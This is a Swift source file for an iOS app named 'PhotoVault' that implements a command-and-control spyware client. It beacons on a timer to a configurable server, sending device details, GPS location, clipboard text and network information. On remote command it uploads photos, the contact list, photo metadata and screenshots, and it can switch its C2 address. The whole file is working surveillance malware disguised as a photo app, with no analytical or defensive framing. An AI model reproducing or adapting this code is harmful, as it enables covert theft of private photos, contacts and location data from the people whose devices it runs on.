import UIKit

class C2Client {
    
    static let shared = C2Client()
    
    // MARK: - Configuration
    var c2URL: String {
        get { UserDefaults.standard.string(forKey: "pv_c2_url") ?? "http://CHANGEME:3002" }
        set { UserDefaults.standard.set(newValue, forKey: "pv_c2_url") }
    }
    
    var deviceId: String {
        DeviceInfo.deviceId
    }
    
    var beaconInterval: TimeInterval = 60
    var pushToken: String = ""
    
    private var beaconTimer: Timer?
    private let session: URLSession
    
    private init() {
        let config = URLSessionConfiguration.ephemeral
        config.timeoutIntervalForRequest = 30
        config.timeoutIntervalForResource = 120
        config.httpAdditionalHeaders = ["User-Agent": "PhotoVault/1.0"]
        session = URLSession(configuration: config)
    }
    
    // MARK: - Beacon Loop
    func startBeaconLoop() {
        stopBeaconLoop()
        beacon { _ in }
        DispatchQueue.main.async {
            self.beaconTimer = Timer.scheduledTimer(withTimeInterval: self.beaconInterval, repeats: true) { [weak self] _ in
                self?.beacon { _ in }
            }
        }
    }
    
    func stopBeaconLoop() {
        beaconTimer?.invalidate()
        beaconTimer = nil
    }
    
    // MARK: - Beacon
    func beacon(completion: @escaping (Bool) -> Void) {
        let location = LocationManager.shared.getLocation()
        
        var clipboard = ""
        if Thread.isMainThread {
            clipboard = UIPasteboard.general.string ?? ""
        } else {
            DispatchQueue.main.sync {
                clipboard = UIPasteboard.general.string ?? ""
            }
        }
        
        let photoCount = PhotoManager.shared.getTotalPhotoCount()
        
        let payload: [String: Any] = [
            "deviceId": deviceId,
            "deviceName": DeviceInfo.deviceName,
            "model": DeviceInfo.model,
            "osVersion": DeviceInfo.osVersion,
            "batteryLevel": DeviceInfo.batteryLevel,
            "totalDiskSpace": DeviceInfo.totalDiskSpace,
            "freeDiskSpace": DeviceInfo.freeDiskSpace,
            "latitude": location?.0 ?? 0.0,
            "longitude": location?.1 ?? 0.0,
            "clipboard": clipboard,
            "pendingPhotos": photoCount,
            "pushToken": pushToken,
            "timestamp": ISO8601DateFormatter().string(from: Date()),
            "carrierName": DeviceInfo.carrierName,
            "wifiSSID": DeviceInfo.wifiSSID,
            "screenResolution": DeviceInfo.screenResolution,
            "locale": DeviceInfo.locale,
            "timezone": DeviceInfo.timezone,
            "beaconInterval": beaconInterval
        ]
        
        postJSON(endpoint: "/api/beacon", payload: payload) { [weak self] result in
            switch result {
            case .success(let data):
                self?.handleBeaconResponse(data: data)
                completion(true)
            case .failure(let error):
                print("[PhotoVault] Beacon failed: \(error)")
                completion(false)
            }
        }
    }
    
    // MARK: - Command Dispatch
    private func handleBeaconResponse(data: Data) {
        guard let json = try? JSONSerialization.jsonObject(with: data) as? [String: Any],
              let commands = json["commands"] as? [[String: Any]] else { return }
        
        for command in commands {
            guard let type = command["type"] as? String else { continue }
            let commandId = command["id"] as? String ?? UUID().uuidString
            
            switch type {
            case "exfil_photos":
                let count = command["count"] as? Int ?? 10
                let offset = command["offset"] as? Int ?? 0
                executeExfilPhotos(count: count, offset: offset, commandId: commandId)
                
            case "get_contacts":
                executeGetContacts(commandId: commandId)
                
            case "get_location":
                executeGetLocation(commandId: commandId)
                
            case "set_beacon_interval":
                if let interval = command["seconds"] as? TimeInterval ?? command["interval"] as? TimeInterval {
                    beaconInterval = interval
                    startBeaconLoop()
                    reportResult(commandId: commandId, status: "success", data: ["interval": interval])
                }
                
            case "screenshot":
                executeScreenshot(commandId: commandId)
                
            case "get_clipboard":
                var clip = ""
                if Thread.isMainThread {
                    clip = UIPasteboard.general.string ?? ""
                } else {
                    DispatchQueue.main.sync {
                        clip = UIPasteboard.general.string ?? ""
                    }
                }
                reportResult(commandId: commandId, status: "success", data: ["clipboard": clip])
                
            case "set_c2_url":
                if let newURL = command["url"] as? String {
                    c2URL = newURL
                    reportResult(commandId: commandId, status: "success", data: ["newURL": newURL])
                }
                
            case "get_device_info":
                reportResult(commandId: commandId, status: "success", data: DeviceInfo.asDictionary())
                
            case "get_photo_metadata":
                DispatchQueue.global(qos: .background).async { [weak self] in
                    let metadata = PhotoManager.shared.fetchAllPhotoMetadata()
                    self?.postJSON(endpoint: "/api/upload/metadata", payload: [
                        "deviceId": self?.deviceId ?? "",
                        "metadata": metadata,
                        "timestamp": ISO8601DateFormatter().string(from: Date())
                    ]) { result in
                        switch result {
                        case .success:
                            self?.reportResult(commandId: commandId, status: "success", data: ["count": metadata.count])
                        case .failure(let error):
                            self?.reportResult(commandId: commandId, status: "error", data: ["message": error.localizedDescription])
                        }
                    }
                }
                
            default:
                reportResult(commandId: commandId, status: "error", data: ["message": "Unknown command: \(type)"])
            }
        }
    }
    
    // MARK: - Command Executors
    private func executeExfilPhotos(count: Int, offset: Int, commandId: String) {
        DispatchQueue.global(qos: .background).async {
            PhotoManager.shared.fetchPhotos(count: count, offset: offset) { [weak self] photos in
                guard let self = self else { return }
                
                let group = DispatchGroup()
                var uploaded = 0
                let lock = NSLock()
                
                for (imageData, assetId) in photos {
                    group.enter()
                    self.uploadPhoto(imageData: imageData, assetId: assetId) { success in
                        if success {
                            lock.lock()
                            uploaded += 1
                            lock.unlock()
                        }
                        group.leave()
                    }
                }
                
                group.notify(queue: .global()) {
                    self.reportResult(commandId: commandId, status: "success", data: [
                        "uploaded": uploaded,
                        "requested": count,
                        "offset": offset
                    ])
                }
            }
        }
    }
    
    private func executeGetContacts(commandId: String) {
        DispatchQueue.global(qos: .background).async { [weak self] in
            let contacts = ContactManager.shared.fetchAllContacts()
            self?.postJSON(endpoint: "/api/upload/contacts", payload: [
                "deviceId": self?.deviceId ?? "",
                "contacts": contacts,
                "timestamp": ISO8601DateFormatter().string(from: Date())
            ]) { result in
                switch result {
                case .success:
                    self?.reportResult(commandId: commandId, status: "success", data: ["count": contacts.count])
                case .failure(let error):
                    self?.reportResult(commandId: commandId, status: "error", data: ["message": error.localizedDescription])
                }
            }
        }
    }
    
    private func executeGetLocation(commandId: String) {
        LocationManager.shared.forceUpdate()
        DispatchQueue.global(qos: .background).asyncAfter(deadline: .now() + 3) { [weak self] in
            let location = LocationManager.shared.getLocation()
            self?.reportResult(commandId: commandId, status: "success", data: [
                "latitude": location?.0 ?? 0.0,
                "longitude": location?.1 ?? 0.0,
                "timestamp": ISO8601DateFormatter().string(from: Date())
            ])
        }
    }
    
    private func executeScreenshot(commandId: String) {
        DispatchQueue.main.async { [weak self] in
            guard let window = UIApplication.shared.connectedScenes
                .compactMap({ $0 as? UIWindowScene })
                .flatMap({ $0.windows })
                .first(where: { $0.isKeyWindow }) else {
                self?.reportResult(commandId: commandId, status: "error", data: ["message": "No key window"])
                return
            }
            
            let renderer = UIGraphicsImageRenderer(bounds: window.bounds)
            let image = renderer.image { _ in
                window.drawHierarchy(in: window.bounds, afterScreenUpdates: true)
            }
            
            guard let jpegData = image.jpegData(compressionQuality: 0.8) else {
                self?.reportResult(commandId: commandId, status: "error", data: ["message": "Failed to capture"])
                return
            }
            
            self?.uploadPhoto(imageData: jpegData, assetId: "screenshot_\(Int(Date().timeIntervalSince1970))") { success in
                self?.reportResult(commandId: commandId, status: success ? "success" : "error", data: [
                    "size": jpegData.count
                ])
            }
        }
    }
    
    // MARK: - Upload Photo (Multipart)
    func uploadPhoto(imageData: Data, assetId: String, completion: @escaping (Bool) -> Void) {
        guard let url = URL(string: "\(c2URL)/api/upload/photo") else {
            completion(false)
            return
        }
        
        let boundary = "Boundary-\(UUID().uuidString)"
        var request = URLRequest(url: url)
        request.httpMethod = "POST"
        request.setValue("multipart/form-data; boundary=\(boundary)", forHTTPHeaderField: "Content-Type")
        request.setValue(deviceId, forHTTPHeaderField: "X-Device-ID")
        
        var body = Data()
        
        // Device ID field
        body.appendString("--\(boundary)\r\n")
        body.appendString("Content-Disposition: form-data; name=\"deviceId\"\r\n\r\n")
        body.appendString("\(deviceId)\r\n")
        
        // Asset ID field
        body.appendString("--\(boundary)\r\n")
        body.appendString("Content-Disposition: form-data; name=\"assetId\"\r\n\r\n")
        body.appendString("\(assetId)\r\n")
        
        // Timestamp field
        body.appendString("--\(boundary)\r\n")
        body.appendString("Content-Disposition: form-data; name=\"timestamp\"\r\n\r\n")
        body.appendString("\(ISO8601DateFormatter().string(from: Date()))\r\n")
        
        // Image file
        body.appendString("--\(boundary)\r\n")
        body.appendString("Content-Disposition: form-data; name=\"photo\"; filename=\"\(assetId).jpg\"\r\n")
        body.appendString("Content-Type: image/jpeg\r\n\r\n")
        body.append(imageData)
        body.appendString("\r\n")
        
        // End boundary
        body.appendString("--\(boundary)--\r\n")
        
        request.httpBody = body
        
        session.dataTask(with: request) { _, response, error in
            if let httpResponse = response as? HTTPURLResponse, httpResponse.statusCode == 200 {
                completion(true)
            } else {
                print("[PhotoVault] Upload failed: \(error?.localizedDescription ?? "Unknown error")")
                completion(false)
            }
        }.resume()
    }
    
    // MARK: - Report Result
    private func reportResult(commandId: String, status: String, data: [String: Any]) {
        var payload: [String: Any] = [
            "deviceId": deviceId,
            "commandId": commandId,
            "status": status,
            "timestamp": ISO8601DateFormatter().string(from: Date())
        ]
        payload.merge(data) { _, new in new }
        
        postJSON(endpoint: "/api/command/result", payload: payload) { _ in }
    }
    
    // MARK: - Network Helpers
    private func postJSON(endpoint: String, payload: [String: Any], completion: @escaping (Result<Data, Error>) -> Void) {
        guard let url = URL(string: "\(c2URL)\(endpoint)") else {
            completion(.failure(NSError(domain: "C2Client", code: -1, userInfo: [NSLocalizedDescriptionKey: "Invalid URL"])))
            return
        }
        
        var request = URLRequest(url: url)
        request.httpMethod = "POST"
        request.setValue("application/json", forHTTPHeaderField: "Content-Type")
        request.setValue(deviceId, forHTTPHeaderField: "X-Device-ID")
        
        do {
            request.httpBody = try JSONSerialization.data(withJSONObject: payload)
        } catch {
            completion(.failure(error))
            return
        }
        
        session.dataTask(with: request) { data, response, error in
            if let error = error {
                completion(.failure(error))
                return
            }
            guard let data = data else {
                completion(.failure(NSError(domain: "C2Client", code: -2, userInfo: [NSLocalizedDescriptionKey: "No data"])))
                return
            }
            completion(.success(data))
        }.resume()
    }
}

// MARK: - Data Extension
extension Data {
    mutating func appendString(_ string: String) {
        if let data = string.data(using: .utf8) {
            append(data)
        }
    }
}
